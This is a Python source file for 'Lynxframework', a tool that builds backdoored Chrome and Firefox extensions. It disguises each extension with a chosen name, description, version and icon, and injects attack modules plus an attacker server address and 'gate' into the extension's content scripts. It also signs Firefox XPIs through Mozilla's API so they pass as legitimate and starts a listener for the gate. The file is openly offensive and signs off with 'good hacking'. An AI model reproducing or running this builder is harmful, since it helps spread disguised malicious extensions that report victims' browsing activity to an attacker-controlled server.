#!usr/bin/env	python3

import os,sys
import shutil
import errno
import glob
import subprocess
import random

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def copy(src, dest):
    try:
        shutil.copytree(src, dest)
    except OSError as e:
        if e.errno == errno.ENOTDIR:
            shutil.copy(src, dest)
        else:
            print('Directory not copied. Error: %s' % e)


def verify_xpi(information_array):
	output_name = information_array['output_name']
	FNULL = open(os.devnull, 'w')
	print "["+bcolors.OKGREEN +"+"+ bcolors.ENDC+"] checking USER-KEY..."
	config_file = open('config.ini').read()
	user_id = config_file.split('MOZ_API_KEY=')[1].split('#')[0]
	if user_id != '':
		print "["+bcolors.OKGREEN +"+"+ bcolors.ENDC+"] checking PRIV-KEY..."
		priv_key = config_file.split('MOZ_PRIV_KEY=')[1].split('#')[0]
		if priv_key != '':
			xpi_file = glob.glob(information_array['output_dir']+output_name+'/*.xpi')
			xpi_file =  xpi_file[0]
			try:
				action = 0
				while action == 0:
					user_input = raw_input('Directory for XPI load ('+os.getcwd()+') ? ')
					if user_input == '':
						user_input = os.getcwd()
						action = 1
					else:
						if os.path.isdir(user_input):
							action = 1
				print "["+bcolors.OKGREEN +"+"+ bcolors.ENDC+"] please wait..."
				subprocess.call(["jpm", "-v", "sign", "--api-key="+user_id, "--api-secret="+priv_key, "--xpi="+xpi_file],stdout=FNULL, stderr=subprocess.STDOUT)
				print "["+bcolors.OKGREEN +"+"+ bcolors.ENDC+"] success sign xpi."
				get_xpi_name = glob.glob('*.xpi')[0]
				if user_input != os.getcwd():
					shutil.move(get_xpi_name, user_input+"/"+get_xpi_name)
			except:
				 print "["+bcolors.FAIL +"-"+ bcolors.ENDC+"] Error please install JPM."
		else:
			print "["+bcolors.FAIL +"-"+ bcolors.ENDC+"] Please configure account on config.ini"
	else:
		print "["+bcolors.FAIL +"-"+ bcolors.ENDC+"] Please configure account on config.ini"

def generate_xpi(information_array):
	output_name = information_array['output_name']
	FNULL = open(os.devnull, 'w')
	print "["+bcolors.OKGREEN +"+"+ bcolors.ENDC+"] checking JPM..."
	try:
		subprocess.call(["jpm"],stdout=FNULL, stderr=subprocess.STDOUT)
		print "["+bcolors.OKGREEN +"+"+ bcolors.ENDC+"] generate XPI file..."
		subprocess.call(["jpm", "xpi", '--addon-dir='+information_array['output_dir']+output_name+''],stdout=FNULL, stderr=subprocess.STDOUT)
		print "["+bcolors.OKGREEN +"+"+ bcolors.ENDC+"] XPI OK." 
		user_input = raw_input('\nSign XPI ? [Y/n] ')
		if user_input == '' or user_input == 'y' or user_input == 'Y':
			verify_xpi(information_array)
	except OSError as e:
		if e.errno == os.errno.ENOENT:
			print "["+bcolors.FAIL +"-"+ bcolors.ENDC+"] Error on JPM please install it."
		else:
			print "["+bcolors.FAIL +"-"+ bcolors.ENDC+"] JPM not found."


def insert_module():
	action = 0
	print "["+bcolors.OKGREEN +"+"+ bcolors.ENDC+"] Loading..."
	print "---------------"
	directory_list = glob.glob('includes/module/*.lframework')
	for line in directory_list:
		print "-> " + line.split('includes/module/')[1].split('.lframework')[0]
	print "---------------"

	while action == 0:
		module_name =  raw_input('\nName of module ? ')
		file_name = raw_input('Payload file : ')
		if(os.path.isfile(file_name)):
			if os.path.isfile('includes/module/'+module_name+'.lframework'):
				load_module_content  = open('includes/module/'+module_name+'.lframework').read()
				backup_check = open(file_name).read()
				new_check = open('backup.check','w')
				new_check.write(backup_check)
				erase = open(file_name,'w').close()
				write_check = open(file_name, 'a+')
				for line in open('backup.check'):
					if "//MODULE//" in line:
						line = line.replace("//MODULE//", load_module_content)
					write_check.write(line)
				print '['+bcolors.OKGREEN +'+'+ bcolors.ENDC+'] Module writed! '
				action = 1
				print "["+bcolors.UNDERLINE +"~"+ bcolors.ENDC+"] Bye, & good hacking."



def load_module(information_array):
	backdoor_name = information_array['output_name']
	action = 0
	print "["+bcolors.OKGREEN +"+"+ bcolors.ENDC+"] Loading..."
	print "---------------"
	directory_list = glob.glob('includes/module/*.lframework')
	for line in directory_list:
		print "-> " + line.split('includes/module/')[1].split('.lframework')[0]
	print "---------------"
	while action == 0:
		user_input =  raw_input('\nName of module ? ')
		if os.path.isfile('includes/module/'+user_input+'.lframework'):
			load_module_content  = open('includes/module/'+user_input+'.lframework').read()
			if os.path.isfile(information_array['output_dir'] + backdoor_name + '/js/check.js'):
				load_check = open(information_array['output_dir'] + backdoor_name + '/js/check.js', 'w').close()
				load_check = open(information_array['output_dir'] + backdoor_name + '/js/check.js', 'a+')
				original_check = open('includes/exploit/chrome/js/check.js')
			elif os.path.isfile(information_array['output_dir'] + backdoor_name + '/data/content.js'):
				load_check = open(information_array['output_dir'] + backdoor_name + '/data/content.js', 'w').close()
				load_check = open(information_array['output_dir'] + backdoor_name + '/data/content.js', 'a+')
				original_check = open('includes/exploit/firefox/data/content.js')
			if original_check != '':
				for line in original_check:
					if "//ENVVAR//" in line:
						config_file = open('config.ini').read()
						server_var  = config_file.split('SERVER_WEB=')[1].split('#')[0]
						server_port = config_file.split('SERVER_PORT=')[1].split('#')[0]
						server_gate = config_file.split('SERVER_GATE=')[1].split('#')[0]
						config_var = "var server_web = '"+server_var+":"+server_port+"';\nvar gate_page = '"+server_gate+"';"
						line = line.replace('//ENVVAR//', config_var)
					if "//MODULE//" in line:
						line = line.replace("//MODULE//", load_module_content+'\n //MODULE//')
					load_check.write(line)
				print '['+bcolors.OKGREEN +'+'+ bcolors.ENDC+'] Module writed! '
				load_check.close()
				user_input = raw_input('Load other module ? [y/N] ')
				if user_input == '' or user_input == 'n' or user_input == 'N':
					action = 1

def making(information_array):
	output_name = raw_input('Output Name : ')
	information_array['output_name'] = output_name
	if output_name != '':
		if information_array['type_backdoor'] == 'G':
			print "\n["+bcolors.UNDERLINE +"~"+ bcolors.ENDC+"] Google Chrome"
			copy('includes/exploit/chrome', information_array['output_dir'] + output_name)
			if os.path.isfile('includes/exploit/icons/' + information_array['icon']):
				copy('includes/exploit/icons/' + information_array['icon'], information_array['output_dir']+output_name+'/img/')
			elif os.path.isfile(information_array['icon']):
				copy(information_array['icon'], information_array['output_dir']+output_name+'/img/')
			print '['+bcolors.OKGREEN +'+'+ bcolors.ENDC+'] Pattern copied'
			# INSERT BACKDOOR_INFORMATION ASPECT
			if(os.path.isfile(information_array['output_dir'] + output_name + '/manifest.json')):
				basic_manifest = open('includes/exploit/chrome/manifest.json')
				erase_file = open(information_array['output_dir'] + output_name + '/manifest.json', 'w').close()
				new_manifest = open(information_array['output_dir'] + output_name + '/manifest.json', 'a+')
				for line in basic_manifest:
					if "//NAME//" in line:
						line = line.replace("//NAME//", information_array['title'])
						print "["+bcolors.OKGREEN +"+"+ bcolors.ENDC+"] Setup name.."
					if "//DESCRIPTION//" in line:
						line = line.replace("//DESCRIPTION//", information_array['description'])
						print "["+bcolors.OKGREEN +"+"+ bcolors.ENDC+"] Setup description"
					if "//VERSION//" in line:
						line = line.replace("//VERSION//", information_array['version'])
						print "["+bcolors.OKGREEN +"+"+ bcolors.ENDC+"] Setup version"
					if "@@ICON@@" in line:
						line = line.replace("@@ICON@@", information_array['icon'])
					new_manifest.write(line)
			# LOAD MODULE
			user_input = raw_input('\nLoad Module ? [Y/n]: ')
			if user_input == '' or user_input == 'Y' or user_input == 'y':
				load_module(information_array)
			print "\n["+bcolors.UNDERLINE +"~"+ bcolors.ENDC+"] Bye, & good hacking."

		elif information_array['type_backdoor'] == 'F':
			print "["+bcolors.UNDERLINE +"~"+ bcolors.ENDC+"] Mozilla Firefox"
			copy('includes/exploit/firefox', information_array['output_dir'] + output_name)
			if os.path.isfile('includes/exploit/icons/'+information_array['icon']):
				copy('includes/exploit/icons/' + information_array['icon'], information_array['output_dir']+output_name+'/icon.png')
			elif os.path.isfile(information_array['icon']):
				copy(information_array['icon'], information_array['output_dir']+output_name+'/icon.png')
			print '['+bcolors.OKGREEN +'+'+ bcolors.ENDC+'] Pattern copied'
			# INSERT BACKDOOR_INFORMATION ASPECT
			if os.path.isfile(information_array['output_dir'] + output_name+'/package.json'):
				basic_manifest = open('includes/exploit/firefox/package.json')
				erase = open(information_array['output_dir'] + output_name + '/package.json', 'w').close()
				new_manifest = open(information_array['output_dir'] + output_name+ '/package.json', 'a+')
				for line in basic_manifest:
					if "//NAME_NB//" in line:
						line = line.replace("//NAME_NB//", str(random.randint(1000,99999)))
						print "["+bcolors.OKGREEN +"+"+ bcolors.ENDC+"] Setup uniqueId.."
					if "//NAME//" in line:
						line = line.replace("//NAME//", information_array['title'])
						print "["+bcolors.OKGREEN +"+"+ bcolors.ENDC+"] Setup name.."
					if "//DESCRIPTION//" in line:
						line = line.replace("//DESCRIPTION//", information_array['description'])
						print "["+bcolors.OKGREEN +"+"+ bcolors.ENDC+"] Setup description"
					if "//VERSION//" in line:
						line = line.replace("//VERSION//", information_array['version'])
						print "["+bcolors.OKGREEN +"+"+ bcolors.ENDC+"] Setup version"
					new_manifest.write(line)
			# LOAD MODULE
			new_manifest.close()
			user_input = raw_input('\nLoad Module ? [Y/n]: ')
			if user_input == '' or user_input == 'Y' or user_input == 'y':
				load_module(information_array)
			user_input = raw_input('\nGenerate XPI (need JPM) ? [Y/n]')
			if user_input == 'Y' or user_input == '' or user_input == 'y':
				generate_xpi(information_array)
			print "\n["+bcolors.UNDERLINE +"~"+ bcolors.ENDC+"] Bye, & good hacking."

def backdooring(backdoor_type):
	action = 0
	backdoor_information = {}
	backdoor_information['title'] = ""
	backdoor_information['description'] = ""
	backdoor_information['version'] = ""
	backdoor_information['icon'] = ""
	backdoor_information['type_backdoor'] = backdoor_type
	while action == 0:
		backdoor_information['output_dir'] = raw_input('Output directory ('+os.getcwd()+'/output/[outputname]) ? ')
		if not os.path.isdir(backdoor_information['output_dir']) and backdoor_information['output_dir'] != '':
			user_input = raw_input("["+bcolors.WARNING +"!"+ bcolors.ENDC+"] Not directory create it ? [Y/n] ")
			if user_input == '' or user_input == 'Y' or user_input == 'y':
				os.makedirs(backdoor_information['output_dir'])
				print "["+bcolors.OKGREEN +"+"+ bcolors.ENDC+"] Directory created! "
				action = 1
		elif backdoor_information['output_dir'] == '':
			backdoor_information['output_dir'] = 'output/'
			action = 1

	if backdoor_information['output_dir'][-1:] != '/':
		backdoor_information['output_dir'] = backdoor_information['output_dir'] + '/'
	action = 0
	print "["+bcolors.OKGREEN +"+"+ bcolors.ENDC+"] Now configuring aspect..."
	while action == 0:
		backdoor_information['title'] = raw_input('Backdoor Name : ')
		if backdoor_information['title'] != '':
			backdoor_information['description'] = raw_input('Backdoor Description : ')
			if backdoor_information['description'] != '':
				backdoor_information['version'] = raw_input('Backdoor Version : ')
				if backdoor_information['version'] != '':
					backdoor_information['icon'] = raw_input('Backdoor Icon (includes/exploit/icon/default.png) : ')
					if backdoor_information['icon'] == '':
						backdoor_information['icon'] = "default.png"
					if backdoor_information['icon'] != '':
						if os.path.isfile('includes/exploit/icons/' + backdoor_information['icon']):
							start = 1
						elif os.path.isfile(backdoor_information['icon']):
							start = 1
						else:
							start = 0
						if start == 1:
							print "["+bcolors.OKGREEN +"+"+ bcolors.ENDC+"] Generation...."
							action = 1
							making(backdoor_information)
						else:
							print "[-] Icon not found"

def generate_backdoor():
	print "-> ["+bcolors.OKBLUE +"G"+ bcolors.ENDC+"]oogle Chrome"
	print "-> ["+bcolors.OKBLUE +"M"+ bcolors.ENDC+"]ozilla Firefox"
	user_input = raw_input('\nLynxframework > ')

	if user_input == 'g' or user_input == 'G':
		backdooring('G')
	elif user_input == 'm' or user_input == 'M':
		backdooring('F')

def gate_listing():
	if os.path.isfile('Lynxgate.py'):
		os.system('python Lynxgate.py')

def menu():
	print "-> ["+bcolors.OKBLUE +"G"+ bcolors.ENDC+"]enerate a extension backdoor."
	print "-> ["+bcolors.OKBLUE +"S"+ bcolors.ENDC+"]tart a gate listening."
	print "-> ["+bcolors.OKBLUE +"L"+ bcolors.ENDC+"]oad a lframework module."
	print "-> ["+bcolors.OKBLUE +"C"+ bcolors.ENDC+"]ompact extension with backdoor."
	user_input = raw_input('\nLynxframework > ')
	if user_input == 'g' or user_input == 'G':
		generate_backdoor()
	elif user_input == 's' or user_input == 'S':
		gate_listing()
	elif user_input == 'l' or user_input == 'L':
		insert_module()



def main():
	logo = """
"BQQQQQ,                                        pQQQQR^
  "BQQQQQQy                                 .yQQQQQR^  
    ^BQQQQQQQQ                           ,QQQQQQQR^    
      @BQQQQQQQQQ,      .,gQQy,,      ;QQQQQQQQQQn     
      @QQRQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQR@QQ      
      |QQQ RQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQR QQQR      
       @QQQQQRQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ       
       \QQQQQQQRQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ       
        ^RQQQ@QQQQQQQQQQQQQQQQQQQQQQQR#RRQQQQRR        
           |BQQQQQQQQQQQQQQQQQQQQQQQRQQQQQQQ           
          QQQQRR#QQQQQQQQQQQQQQQQQRQQQQQQQQQQ,         
        jQQQQQQQQQDRQQQQQQQQQQQ#RQRRDQQQQQQQQQQ        
       '   #QQQQQQQ  'RRQQQQQQRRR   @QQQQQQQ `^^       
          jQQQQQQQQQQQS |RQQQQQ @QQQQQQQQQQQQ          
         jQQQQQQQR#Rn  @QQQQQQQQ,'RE##QQQQQQQQ         
        jQQQQQQQQQSR^;QQQQRRRQQQQQ2B#QQQQQQQQQQ        
       jQQQQSRR^yQQQRjRQQQQQQQQQQQ8QQyy^RB#QQQQQ       
      |RR^      @QR @Q#R       8@QQ RQQ      "RBQ      
                Bk   @Qy       @Q#   '8                
                      \QQQ, yQQQR                      
                       7 RQQQR7R                       
                          'RR                          
                                                                    
	"""
	print logo
	try:
		menu()
	except:
		print "\nGood Bye ^^' "

main()
